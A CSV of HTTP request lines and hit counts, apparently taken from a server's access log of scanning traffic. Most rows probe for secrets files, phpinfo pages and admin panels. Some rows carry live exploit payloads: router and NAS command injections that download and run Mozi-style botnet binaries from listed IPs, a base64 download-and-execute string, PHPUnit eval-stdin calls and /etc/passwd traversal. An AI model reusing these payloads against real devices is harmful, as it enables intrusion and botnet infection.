url,count
POST /xmlrpc.php HTTP/1.1,7639
GET / HTTP/1.1,1069
GET /manager/html HTTP/1.1,956
POST /dr/tomcat.jsp HTTP/1.1,210
POST /tomcat.jsp HTTP/1.1,210
POST /autodiscover HTTP/1.1,146
CONNECT google.com:443 HTTP/1.1,126
GET /.env HTTP/1.1,125
GET /favicon.ico HTTP/1.1,108
GET / HTTP/1.0,96
GET /tomcat.jsp HTTP/1.1,87
POST / HTTP/1.1,73
GET /dr/tomcat.jsp HTTP/1.1,70
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1,63
CONNECT www.google.com:443 HTTP/1.1,39
GET /.git/config HTTP/1.1,36
GET /info.php HTTP/1.1,29
GET /bundle.js HTTP/1.1,26
GET /1.php HTTP/1.1,26
GET /upl.php HTTP/1.1,25
GET /files/ HTTP/1.1,25
GET /form.html HTTP/1.1,25
GET /geoip/ HTTP/1.1,25
GET /systembc/password.php HTTP/1.1,25
GET /password.php HTTP/1.1,25
GET /geoserver/web/ HTTP/1.1,22
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1,21
GET /actuator/gateway/routes HTTP/1.1,21
GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1,20
GET /robots.txt HTTP/1.1,19
GET /debug/default/view?panel=config HTTP/1.1,14
GET /sitemap.xml HTTP/1.1,13
POST /boaform/admin/formLogin HTTP/1.1,12
GET /_profiler/phpinfo HTTP/1.1,11
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1,11
POST /GponForm/diag_Form?images/ HTTP/1.1,10
HEAD / HTTP/1.1,9
GET /hudson HTTP/1.1,9
GET /actuator/health HTTP/1.1,9
GET /druid/index.html HTTP/1.1,9
GET /.vscode/sftp.json HTTP/1.1,9
GET /config.json HTTP/1.1,8
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F94.156.79.193%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1,8
GET /portal/redlion HTTP/1.1,8
GET /.DS_Store HTTP/1.1,8
GET /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0= HTTP/1.1,8
GET http://httpbin.org/ip HTTP/1.1,7
GET /server-status HTTP/1.1,6
GET /sendgrid/.env HTTP/1.1,6
GET /cgi/conf.bin HTTP/1.1,6
GET /mailman/listinfo/mailman HTTP/1.1,6
GET /v2/_catalog HTTP/1.1,6
GET /api/.env HTTP/1.1,6
POST /core/.env HTTP/1.1,5
GET /axis2-admin/ HTTP/1.1,5
GET /aab8 HTTP/1.1,5
GET /axis2/ HTTP/1.1,5
GET /telescope/requests HTTP/1.1,5
GET /core/.env HTTP/1.1,5
GET /aaa9 HTTP/1.1,5
GET /axis2/axis2-admin/ HTTP/1.1,5
GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0,4
GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0,4
GET /cgi-bin/authLogin.cgi HTTP/1.1,4
GET /Kvsh/geti.php HTTP/1.1,4
GET /manager/text/list HTTP/1.1,4
GET /ReportServer HTTP/1.1,4
GET /laravel/.env HTTP/1.1,4
GET /phpmyadmin/index.php HTTP/1.1,4
GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1,4
GET /about HTTP/1.1,3
GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /Pages/log/ HTTP/1.1,3
GET /wp-content/plugins/kingcomposer/readme.txt HTTP/1.1,3
GET /cdn-cgi/trace HTTP/1.1,3
GET /_all_dbs HTTP/1.1,3
GET /login.action HTTP/1.1,3
GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1,3
GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /Kvsh/c.php?server=1&type=1 HTTP/1.1,3
GET /server HTTP/1.1,3
GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1,3
GET /s/0343e2837313e2234323e2333313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1,3
POST /sdk HTTP/1.1,3
GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1,3
POST /Kvsh/login/index_main.php HTTP/1.1,3
GET /solr/admin/info/system HTTP/1.1,3
GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1,3
GET /xmlrpc.php?rsd HTTP/1.1,3
GET /site/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /web/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /Temporary_Listen_Addresses HTTP/1.1,3
GET /__tests__/test-become/.env HTTP/1.1,3
GET /?author=1 HTTP/1.1,3
POST /login HTTP/1.1,3
POST /wp-login.php HTTP/1.1,3
GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /redmine/.env HTTP/1.1,3
GET /phpmyadmin4.8.5/index.php HTTP/1.1,3
GET /docker/.env HTTP/1.1,3
GET /test/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /.well-known/security.txt HTTP/1.1,3
GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1,3
GET /?rest_route=/wp/v2/users/ HTTP/1.1,3
GET /frontend_dev.php/$ HTTP/1.1,2
GET /web/debug/default/view HTTP/1.1,2
GET /debug/default/view HTTP/1.1,2
GET /debug/default/view?panel=config/frontend_dev.php HTTP/1.1,2
HEAD /.env HTTP/1.1,2
GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1,2
GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0,2
GET /smtp.json HTTP/1.1,2
GET /sources/.env HTTP/1.1,2
GET /wp-admin/install.php?step=1&language=en_GB HTTP/1.1,2
GET /blog/.env HTTP/1.1,2
GET /sftp-config.json HTTP/1.1,2
GET /wp-content/ HTTP/1.1,2
GET /ext-js/app/common/zld_product_spec.js HTTP/1.1,2
GET /.env.dev HTTP/1.1,2
GET /app/.env HTTP/1.1,2
GET /apps/.env HTTP/1.1,2
GET /blogs/.env HTTP/1.1,2
GET /local/.env HTTP/1.1,2
GET /shared/.env HTTP/1.1,2
GET /.env.php HTTP/1.1,2
GET /rest/.env HTTP/1.1,2
GET /cp/.env HTTP/1.1,2
GET /fedex/.env HTTP/1.1,2
GET /sapi/debug/default/view HTTP/1.1,2
GET /sites/.env HTTP/1.1,2
GET /awsconfig.json HTTP/1.1,2
GET /sendgrid.json HTTP/1.1,2
GET /aws.json HTTP/1.1,2
GET /env.json HTTP/1.1,2
GET /zabbix/favicon.ico HTTP/1.1,2
GET /.json HTTP/1.1,2
GET /wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,2
GET /favicon-32x32.png HTTP/1.1,2
POST /docker/.env HTTP/1.1,2
GET /.env.save HTTP/1.1,2
GET /frontend/web/debug/default/view HTTP/1.1,2
GET /system/.env HTTP/1.1,2
GET /private/.env HTTP/1.1,2
GET /script/.env HTTP/1.1,2
GET /.env.production HTTP/1.1,2
GET /.env.prod HTTP/1.1,2
GET /.env.old HTTP/1.1,2
GET /.env.dist HTTP/1.1,2
GET /back/.env HTTP/1.1,2
GET /site/.env HTTP/1.1,2
GET /debug/default/view.html HTTP/1.1,2
GET /web/.env HTTP/1.1,2
GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /_phpinfo.php HTTP/1.1,2
GET /auth/login.html HTTP/1.1,2
GET /_info.php HTTP/1.1,2
GET /config/config.json HTTP/1.1,2
GET /_info-backoffice.php HTTP/1.1,2
GET /wp-includes/ID3/license.txt HTTP/1.1,2
GET /feed/ HTTP/1.1,2
GET /__info.php HTTP/1.1,2
GET /html/phpinfo.php HTTP/1.1,2
GET /symfony/public/_profiler/phpinfo HTTP/1.1,2
GET /config/default.json HTTP/1.1,2
GET /_phpinf.php HTTP/1.1,2
GET /phpinfo HTTP/1.1,2
GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1,2
GET /parameters.yml HTTP/1.1,2
GET /.aws/credentials HTTP/1.1,2
GET /app_dev.php/_profiler/phpinfo HTTP/1.1,2
GET /app/config/parameters.yml HTTP/1.1,2
GET /tool/view/phpinfo.view.php HTTP/1.1,2
GET /public/.env HTTP/1.1,2
GET /phpinfo.php HTTP/1.1,2
GET /backend/.env HTTP/1.1,2
GET /_poopinfo.php HTTP/1.1,2
HEAD http://112.124.42.80:63435/ HTTP/1.1,2
GET /Public/home/js/check.js HTTP/1.1,2
GET /download/.env HTTP/1.1,2
GET /database/.env HTTP/1.1,2
GET /pmd/index.php HTTP/1.1,2
GET /client/.env HTTP/1.1,2
GET /docs/.env HTTP/1.1,2
GET /main/.env HTTP/1.1,2
GET /cgi-sys/defaultwebpage.cgi HTTP/1.1,2
GET /.well-known/probing.txt HTTP/1.1,2
GET /static/admin/javascript/hetong.js HTTP/1.1,2
GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1,2
GET login.cgi HTTP/1.1,2
GET /gists/cache HTTP/1.1,2
GET /admin/.env HTTP/1.1,2
GET /lib/.env HTTP/1.1,2
GET /evox/about HTTP/1.1,2
GET /uploads/.env HTTP/1.1,2
GET /_wpeprivate/config.json HTTP/1.1,2
POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1,2
GET /HNAP1 HTTP/1.1,2
HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1,1
GET /identity HTTP/1.1,1
GET /showLogin.cc HTTP/1.1,1
GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1,1
GET /sugar_version.json HTTP/1.1,1
GET /solr/ HTTP/1.1,1
GET /static/historypage.js HTTP/1.1,1
GET /api/session/properties HTTP/1.1,1
GET /index.jsp HTTP/1.1,1
GET /sitecore/shell/sitecore.version.xml HTTP/1.1,1
GET /js/NewWindow_2_all.js HTTP/1.1,1
GET /admin/ HTTP/1.1,1
GET /webfig/ HTTP/1.1,1
HEAD /icons/sphere1.png HTTP/1.1,1
POST /phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1,1
POST /vendor/phpunit/Util/PHP/eval-stdin.php%20/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
GET /config.dat HTTP/1.0,1
POST /.env.prod HTTP/1.1,1
GET /c/ HTTP/1.1,1
GET /db_backup/ HTTP/1.1,1
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /.env.production HTTP/1.1,1
HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1,1
POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
POST /.env HTTP/1.1,1
POST /.env.save HTTP/1.1,1
POST /.env.old HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F185.224.128.34%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1,1
POST /system/.env HTTP/1.1,1
GET /.env.development%20 HTTP/1.1,1
GET /development/.env%20 HTTP/1.1,1
POST /redmine/.env HTTP/1.1,1
GET /enviroments/.env.production HTTP/1.1,1
POST /private/.env HTTP/1.1,1
POST /apps/.env%20 HTTP/1.1,1
GET /apps/.env%20 HTTP/1.1,1
POST /development/.env%20 HTTP/1.1,1
POST /app/.env%20 HTTP/1.1,1
POST /cms/.env HTTP/1.1,1
GET /app/.env%20 HTTP/1.1,1
POST /api/.env HTTP/1.1,1
POST /admin-app/.env%20 HTTP/1.1,1
GET /admin-app/.env%20 HTTP/1.1,1
POST /laravel/.env%20 HTTP/1.1,1
GET /laravel/.env%20 HTTP/1.1,1
GET /cms/.env HTTP/1.1,1
POST /script/.env HTTP/1.1,1
POST /sources/.env HTTP/1.1,1
POST /.env.project%20 HTTP/1.1,1
POST /.env.dist HTTP/1.1,1
GET /live_env%20 HTTP/1.1,1
POST /live_env%20 HTTP/1.1,1
GET /application/.env HTTP/1.1,1
POST /application/.env HTTP/1.1,1
GET /.env.project%20 HTTP/1.1,1
POST /back/.env HTTP/1.1,1
POST /shared/.env%20 HTTP/1.1,1
POST /.env.development%20 HTTP/1.1,1
POST /fedex/.env HTTP/1.1,1
POST /__tests__/test-become/.env HTTP/1.1,1
POST /local/.env HTTP/1.1,1
POST /rest/.env HTTP/1.1,1
GET /shared/.env%20 HTTP/1.1,1
POST /phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,1
HEAD / HTTP/1.0,1
POST /enviroments/.env.production HTTP/1.1,1
GET /deployment-config.json HTTP/1.1,1
GET /db/robomongo.json HTTP/1.1,1
POST /enviroments/.env HTTP/1.1,1
GET /AwsConfig.json HTTP/1.1,1
GET /conf.json HTTP/1.1,1
GET /db.json HTTP/1.1,1
GET /ws-config.json HTTP/1.1,1
GET /robomongo.json HTTP/1.1,1
GET /config/parameters.yml HTTP/1.1,1
GET /_profiler/open?file=app/config/parameters.yml HTTP/1.1,1
GET /client_secrets.json HTTP/1.1,1
GET /user-config.json HTTP/1.1,1
GET /ssh-config.json HTTP/1.1,1
GET /database-config.json HTTP/1.1,1
GET /credentials/config.json HTTP/1.1,1
GET /nmaplowercheck1713372128 HTTP/1.1,1
GET /?phpinfo=1 HTTP/1.1,1
GET /enviroments/.env HTTP/1.1,1
GET /02-info.php HTTP/1.1,1
GET /NmapUpperCheck1713372128 HTTP/1.1,1
GET /?phpinfo=-1 HTTP/1.1,1
GET /.__info.php HTTP/1.1,1
GET /.info.php HTTP/1.1,1
GET /0.0_phpinfo.php HTTP/1.1,1
GET /00_server_info.php HTTP/1.1,1
GET /5info.php HTTP/1.1,1
GET /pub/time.series/overview.txt HTTP/1.1,1
GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php HTTP/1.1,1
GET /api/index.php/v1/config/application?public=true HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.45.94:50744/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /gui/status_main.cgi HTTP/1.1,1
GET /feed/jolts.rss HTTP/1.1,1
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.178.18.1:35033/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0,1
GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1,1
GET /wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /website/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /wp-includes/admin.php?520 HTTP/1.1,1
GET /cmd.cgi HTTP/1.1,1
GET /downloader.php?file=;echo%20d2dldCBodHRwOi8vMTQxLjk4LjEwLjc2L2Jvb3RlcnMvYm9vdGVyLmFybTc7IGNobW9kIDc3NyBib290ZXIuYXJtNzsgLi9ib290ZXIuYXJtNyBib290ZXIuYXJtNw==%3D%3D%7Cbase64%20-d%7Cbash%00.zip HTTP/1.1,1
GET //.env HTTP/1.1,1
GET /wp-includes/about.php?520 HTTP/1.1,1
GET /wp-admin/about.php?520 HTTP/1.1,1
GET /wp-content/about.php?520 HTTP/1.1,1
GET /wp-admin/admin.php?520 HTTP/1.1,1
GET /news/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /wp-content/admin.php?520 HTTP/1.1,1
GET /about.php?520 HTTP/1.1,1
GET /admin.php?520 HTTP/1.1,1
GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /media/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwlzQ1ROekdEeVZxT0NVZVVicQ== HTTP/1.0,1
GET /v1/agent/self HTTP/1.1,1
GET /System/configurationFile?auth=YWRtaW46MTEK HTTP/1.1,1
GET /CFIDE/administrator/ HTTP/1.1,1
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0,1
GET /HNAP1/ HTTP/1.1,1
HEAD /config.json HTTP/1.1,1
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(%22hi%22));?>+/tmp/index1.php HTTP/1.1,1
GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1,1
GET /../../../../../etc/passwd%00 HTTP/1.1,1
GET /../../../../../mnt/mtd/Config/Account1 HTTP/1.1,1
GET /../../../../../etc/passwd%00 HTTP/1.0,1
GET /../../../../../etc/passwd HTTP/1.0,1
GET /../../../../../mnt/mtd/Config/Account1 HTTP/1.0,1
GET /current_config/Account1 HTTP/1.1,1
GET /current_config/passwd HTTP/1.1,1
GET /../../../../../etc/passwd HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWFybTU= HTTP/1.1,1
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuNzkuMTI5L2xvbHxzaA== HTTP/1.1,1
GET /test123.php HTTP/1.1,1
GET /_profiler/empty/search/results HTTP/1.1,1
CONNECT dope.root.africa:443 HTTP/1.1,1
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,1
GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0,1
OPTIONS / HTTP/1.0,1
POST /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1 HTTP/1.1,1
GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/ HTTP/1.1,1
GET /cgi-bin/login.cgi HTTP/1.1,1
CONNECT ifconfig.me:443 HTTP/1.1,1
GET /wp-config.php. HTTP/1.1,1
GET /SSMDIyLzM1My8wNjkvNTFedzA/start.jsp HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl+http%3A%2F%2F193.222.96.163%2Ft.sh+%7C+sh+%7C%7C+wget+-O-+http%3A%2F%2F193.222.96.163%2Ft.sh+%7C+sh) HTTP/1.1,1
GET /Nmap/folder/check1713372847 HTTP/1.1,1
GET /NmapUpperCheck1713372847 HTTP/1.1,1
GET /nmaplowercheck1713372847 HTTP/1.1,1
GET /cpanel HTTP/1.1,1
GET /agent/timeclock.php HTTP/1.1,1
GET /wp-admin/.env HTTP/1.1,1
GET /Nmap/folder/check1714100505 HTTP/1.1,1
GET /wordpress HTTP/1.1,1
POST /cgi-bin/param.cgi?post_network_other_conf HTTP/1.1,1
CONNECT files.vc:443 HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F91.92.243.102%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh) HTTP/1.1,1
GET /nmaplowercheck1714100505 HTTP/1.1,1
GET /NmapUpperCheck1714100505 HTTP/1.1,1
GET /wordpress/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /new/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
GET /old HTTP/1.1,1
GET /wordpress/wp-admin/install.php?step=1&language=en_GB HTTP/1.1,1
GET /wp HTTP/1.1,1
GET /wp/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1,1
